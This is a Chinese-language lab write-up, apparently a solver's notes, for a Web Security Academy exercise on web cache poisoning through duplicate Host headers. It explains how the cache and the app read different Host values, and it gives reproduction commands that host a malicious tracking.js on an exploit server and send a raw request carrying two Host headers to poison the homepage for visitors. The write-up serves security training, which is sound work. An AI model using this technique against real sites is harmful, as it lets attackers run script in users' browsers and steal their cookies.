---
title: lab-host-header-web-cache-poisoning-via-ambiguous-requests
---

# lab-host-header-web-cache-poisoning-via-ambiguous-requests

> evidences: [[host-header-family]], [[cache-poisoning-family]]

- 题面:污染首页缓存,使访客执行 `alert(document.cookie)`。
- 实例(批46):https://0aa200e60304912081d793d4005d0017.h1-web-security-academy.net · exploit:https://exploit-0a99008b03219139813092800176006e.exploit-server.net
- 状态:**solved**(访客浏览器实取泄露 JS;exploit server 自家横幅 `is-solved` + `<h4>Congratulations, you solved the lab!</h4>`)

## 解法(两个 Host 头;`_lab` 是钥匙)

1. 唯一反射点(首页 1 处):`<script src="//<Host 全值>/resources/js/tracking.js">`。
2. **重复 Host 头的 400 是边缘的,不是 app 的**:批42R 不带 cookie 时两个 `Host:` → `400 {"error":"Duplicate header names are not allowed"}`;带上 `_lab` 实例 cookie 后**同一形状被放行**(见 [[academy-边缘的-_lab-会话门-host-检查与重复头放行]])。
3. 分裂方向(缓存 vs app):
   - `Host: <lab>`(第一)+ `Host: <exploit>`(第二)→ 200,**`X-Cache: miss`**,body 11079B(比基线 11080 少 1 = exploit 主机名短 1 字符),`src="//exploit-…/resources/js/tracking.js"` ⇒ **缓存按第一个 Host 取键、app 渲染第二个 Host**;
   - 反向(`Host: <exploit>` 先)→ **504 `connecting to exploit-…`** ⇒ 路由也按第一个 Host。
   - 再以普通 `Host: <lab>` 读同一 URL → **`X-Cache: hit` 且返回同一 11079B 体** ⇒ 致毒体确实落在 lab 键上。
4. 交付:exploit server `STORE responseFile=/resources/js/tracking.js` + `Content-Type: application/javascript` + body `alert(document.cookie);`;对 `/`(受害者实际访问的 URL)发一次分裂请求,`max-age=30` 内受害者来访即执行。

## 证据摘录

```
(raw_matrix) 1_lab+exploit → 200 X-Cache=miss 11079B marker_hit=true  |  2_exploit+lab → 504 connecting to exploit-…
exploit ACCESS_LOG: 10.0.3.145 "GET /resources/js/tracking.js HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) …"  (×2)
```

## 复现命令

```
range_launch launch 2D282E25…7C8A7D2CBF --jar ~/.pi-rs/agent/chrome-jar.json
http_session post "https://<exploit>/" --jar <jar> --follow --form urlIsHttps=on \
  --form responseFile=/resources/js/tracking.js --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: application/javascript' \
  --form 'responseBody=alert(document.cookie);' --form formAction=STORE
conn_reuse "https://<inst>/" --send-str 'GET / HTTP/1.1\r\nHost: <inst>\r\nHost: <exploit>\r\nCookie: _lab=<...>; session=<...>\r\nConnection: close\r\n\r\n'
```

## 关系

- 族:[[host-header-family]]、[[cache-poisoning-family]];边缘 `_lab` 门见 [[academy-edge-lab-cookie-gate]]。
- 批42R 的两条否证按本档改写:「缓存只在 lab-app 路由内」成立,但**app 渲染出的致毒首页本身会被缓存到 lab 键**;「重复 Host 被封」只在无 `_lab` 时成立。
